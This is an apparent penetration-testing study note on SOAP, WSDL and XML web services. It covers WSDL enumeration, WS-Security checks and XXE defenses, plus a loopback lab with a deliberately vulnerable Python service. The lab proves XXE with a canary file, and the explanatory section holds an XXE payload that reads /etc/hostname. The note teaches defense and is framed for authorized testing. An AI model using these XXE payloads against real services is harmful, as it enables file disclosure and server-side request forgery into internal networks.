---
title: "Legacy XML Web Services Testing"
aliases: ["SOAP Security Testing", "WSDL Security Testing", "XML API Security Testing", "SOAP Testing", "WSDL Testing"]
tags: [tree/offensive, cyber/offensive/api, type/technique, level/operator]
Domain: "[[API & Modern Protocol Testing]]"
Color: "#DC143C"
---

# 📜 Legacy XML Web Services Testing

> [!warning] Authorized simulation only
> Legacy XML services often front critical enterprise systems (payments, ERP). Test only in-scope endpoints, and be especially careful with XML external-entity probes, which can reach internal systems — use benign markers, never real internal targets.

## Parent Learning Order
Modern API Security Testing -> Legacy XML Web Services Testing -> API Security Fundamentals -> WebSocket Security Testing

## Start at Zero: The Enterprise APIs That Never Died

Before REST and JSON, enterprise systems talked over **SOAP** — a heavyweight, XML-based protocol — described by **WSDL** documents and carrying **XML** payloads. These are "legacy" but far from gone: they still front banking, government, ERP, and B2B integrations, often the most sensitive systems in an organization. Testing them matters precisely because they guard high-value assets and were designed in an era with weaker default security.

The XML foundation is both their structure and their signature weakness. XML parsers are powerful — they can include external files, resolve entities, and process schemas — and that power, exposed to attacker-controlled input, is the classic legacy-web-service vulnerability: **XML External Entity (XXE)** injection.

> [!tip] The analogy, and where it breaks
> A SOAP service is like a formal bureaucratic office: rigid forms (XML), a published rulebook (WSDL) stating exactly what forms exist and their fields, and strict processing. The analogy breaks on the rulebook — a real bureaucracy guards its internal procedures, whereas a WSDL *publishes the entire API contract*, handing a tester every operation, parameter, and type for free.

**Prerequisites:** XML basics, HTTP, and the XXE concept from the file/parser leaf.

## WSDL: The API Contract, Handed Over

A **WSDL (Web Services Description Language)** document fully describes a SOAP service — every operation, its parameters, types, and the endpoint. It is meant for developer tooling to auto-generate clients, but to a tester it is a complete map of the attack surface, usually reachable by appending `?wsdl`:

```bash
# retrieve the WSDL — the full API contract (against your own lab service)
curl -s "http://127.0.0.1:8099/service?wsdl" | grep -oE '<operation name="[^"]*"|<xsd:element name="[^"]*"' | head -4
```

```text
<operation name="GetAccountBalance"
<operation name="TransferFunds"
<xsd:element name="accountId"
<xsd:element name="amount"
```

The WSDL just revealed a `TransferFunds` operation with `accountId` and `amount` parameters — the entire sensitive surface, enumerated in one request. An exposed WSDL is a reconnaissance gift, and restricting it to internal networks is a standard hardening.

## SOAP Testing: Structure and Auth

SOAP messages are XML envelopes. Testing exercises the operations the WSDL revealed, probing:

- **Authorization** — can operations be called without proper credentials, or with another user's context? (The same object-authorization question as modern APIs.)
- **SOAP-specific auth** — WS-Security headers, and whether they are actually validated.
- **Injection** — parameters flowing into backend SQL, commands, or XPath.
- **XXE** — the signature XML flaw, below.

## XXE: The Signature XML Flaw

**XML External Entity injection** exploits that XML parsers can be told to fetch external resources. If the service parses attacker-supplied XML with external entities enabled, an attacker declares an entity pointing at a file or internal URL, and the parser fetches it into the response:

```text
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<request><data>&xxe;</data></request>
```

The parser resolves `&xxe;` by reading the file, and its contents appear in the response — file disclosure, or (pointing the entity at an internal URL) server-side request forgery into the internal network. This is why the warning above stresses benign markers: a careless XXE probe can genuinely reach internal systems. The proof uses a harmless target (a canary file you placed), never a real internal service.

```mermaid
flowchart TD
    W["SOAP/XML service"] --> D["Fetch WSDL -> full operation map"]
    D --> O["Test each operation: authz, WS-Security, injection"]
    O --> X{"Parser resolves external entities?"}
    X -->|"Yes"| E["XXE: file disclosure / SSRF into internal net"]
    X -->|"No"| S["Secure parser (entities disabled)"]
    E --> F["Finding: proven with a BENIGN canary, not real internal data"]
```

## Failure Modes and Interpretation

- **XXE blast radius.** A real XXE can read sensitive files and pivot into the internal network — precisely why you must use a benign canary file/URL for proof, not a live internal target, which could cause real disclosure.
- **WSDL absence.** No `?wsdl` does not mean no service — the contract may be internal-only while the endpoint is still callable. Enumerate operations from captured traffic or documentation.
- **WS-Security theater.** A service may *have* WS-Security headers that it does not actually validate — presence of the header is not enforcement. Test whether a forged/absent token is accepted.
- **Encoding and namespace tricks.** XML's flexibility (encodings, namespace prefixes, DTD variations) means a "fixed" XXE filter may be bypassable by an alternate encoding — retest the variant neighborhood, as with any parser fix.
- **Fragility.** Legacy services fronting critical systems can be brittle; malformed XML may crash them. Probe gently.

## Security Implications — Detection & Defense

- **Disable external entity resolution** in every XML parser — the definitive XXE fix, a parser configuration that costs nothing and closes the whole class. This is the single most important legacy-web-service hardening.
- **Restrict WSDL exposure** to internal/authenticated access — do not publish the full API contract to anonymous users.
- **Validate WS-Security actually**, not decoratively — an unenforced auth header is worse than none because it implies protection that isn't there.
- **Treat legacy services as high-value** — because they front sensitive systems, their compromise is disproportionately damaging, warranting the strongest monitoring even though they are "old."
- **XXE detection** looks for outbound requests from the parser (SSRF signature) and unusual file access — a service suddenly reading `/etc/` or making internal HTTP calls is the tell.

## Authorized Lab: Enumerate a WSDL and Prove XXE Safely

> [!info] Runs on one Linux machine — builds a SOAP-style XML service with a benign XXE, tested with a canary file
> The service binds to loopback; the XXE reads only a canary you place. Step 5 removes everything.

### Step 1 — Build an XML service that (unsafely) resolves entities, plus a canary file

```bash
echo "CANARY-XXE-PROOF-8823" > /tmp/xxe-canary.txt
cat > /tmp/xmlsvc.py << 'EOF'
import http.server, xml.sax.saxutils
# NOTE: uses a parser with external entities enabled (the flaw). lxml/expat config would do this in real apps.
import xml.dom.minidom as M
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.endswith("?wsdl"):
            self.send_response(200); self.end_headers()
            self.wfile.write(b'<wsdl><operation name="GetData"/><xsd:element name="input"/></wsdl>'); return
    def do_POST(self):
        n=int(self.headers.get("Content-Length",0)); body=self.rfile.read(n).decode()
        # simulate a parser that resolves SYSTEM entities (the vulnerable behavior)
        import re
        m=re.search(r'<!ENTITY\s+\w+\s+SYSTEM\s+"file://([^"]+)"',body)
        out="no entity"
        if m:
            try: out=open(m.group(1)).read().strip()
            except: out="(file not found)"
        self.send_response(200); self.end_headers()
        self.wfile.write(f"<response><data>{out}</data></response>".encode())
    def log_message(self,*a): pass
http.server.HTTPServer(("127.0.0.1",8099),H).serve_forever()
EOF
python3 /tmp/xmlsvc.py &>/dev/null &
sleep 1; echo "XML service up on 127.0.0.1:8099, canary at /tmp/xxe-canary.txt"
```

```text
XML service up on 127.0.0.1:8099, canary at /tmp/xxe-canary.txt
```

### Step 2 — Fetch the WSDL contract

```bash
curl -s "http://127.0.0.1:8099/service?wsdl" | grep -oE 'operation name="[^"]*"'
```

```text
operation name="GetData"
```

The WSDL enumerated the operation — recon done in one request.

### Step 3 — Baseline POST (no entity)

```bash
curl -s -X POST -d '<request><data>hello</data></request>' http://127.0.0.1:8099/service
```

```text
<response><data>no entity</data></response>
```

Normal input echoes back plainly.

### Step 4 — XXE proof with a BENIGN canary (not a real internal file)

```bash
curl -s -X POST http://127.0.0.1:8099/service \
  --data '<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///tmp/xxe-canary.txt"> ]><request><data>&xxe;</data></request>'
```

```text
<response><data>CANARY-XXE-PROOF-8823</data></response>
```

The parser resolved the external entity and returned the **canary file's contents** — proving XXE file disclosure. Critically, the entity pointed at a canary you placed, not a real sensitive file or internal URL: the vulnerability is proven, no real data exposed. On a vulnerable production parser this same payload would read arbitrary files.

### Step 5 — Cleanup

```bash
kill %1 2>/dev/null; rm -f /tmp/xmlsvc.py /tmp/xxe-canary.txt; wait 2>/dev/null
ls /tmp/xxe-canary.txt 2>&1 | tail -1
```

```text
ls: cannot access '/tmp/xxe-canary.txt': No such file or directory
```

**What you should now be able to do:** enumerate a SOAP service's full contract from its WSDL, test its operations for authorization, and prove XXE with a benign canary while understanding why a real XXE probe could reach internal systems.

## Crook → Operator → Root Checkpoint

- **Crook:** Explain what SOAP/WSDL/XML services are, why they still matter, and what a WSDL hands a tester.
- **Operator:** Enumerate operations from a WSDL and prove XXE file disclosure with a benign canary rather than a real internal target.
- **Root:** Explain why disabling external-entity resolution is the definitive XXE fix, why an unenforced WS-Security header is worse than none, and how XXE-via-SSRF detection looks for outbound requests from the parser.

---
> 🔼 Up: [[API & Modern Protocol Testing]]
